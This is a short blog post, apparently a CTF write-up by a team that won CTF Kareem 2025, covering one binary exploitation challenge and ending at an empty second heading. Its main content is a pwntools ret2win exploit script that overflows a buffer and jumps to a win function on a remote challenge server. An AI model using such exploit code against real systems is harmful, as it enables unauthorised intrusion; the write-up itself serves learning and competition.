---
title: CTF Kareem Writeups
description: This is a writeup of the challenges I have solved during the CTF kareem organized by Securinet TEKUP.
author: alternox
date: 2025-03-15 12:00:00 +0000
categories: [Blogging, Writeups]
tags: [Writeups]
render_with_liquid: false
image:
  path: /assets/img/ctfkareem2025/ctfkareemlogo.jpg
---

بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ


## Event description

CTF Kareem was a CTF orgnanized by Securinets TEKUP During Ramadhan, an overnight CTF for about 10.30 Hours, me and my team played as "Kaskrout b tey" and landed the first place.

![Scoreboard](/assets/img/ctfkareem2025/scoreboard.jpg)

## Binary Exploitation
### The River's Daughter
Challenge: 
![First Pwn Task](/assets/img/ctfkareem2025/pwntask1.png)

This is a simple ret2win challenge, so we do the usual, calculating the offset then getting the win address:

```python
#!/bin/python3
from pwn import *

local = False
name = 'main' 
e = ELF(name)
if local:
	p = process(name)
else:
	p = remote("51.77.140.155", 1329)
rop = ROP(e)

ret= 0x000000000040101a
win = 0x000000000040132d

payload = cyclic(64+8)
payload += p64(win+1)
p.recv()
p.sendline(payload)
p.interactive()
```

### Patrick Bateman


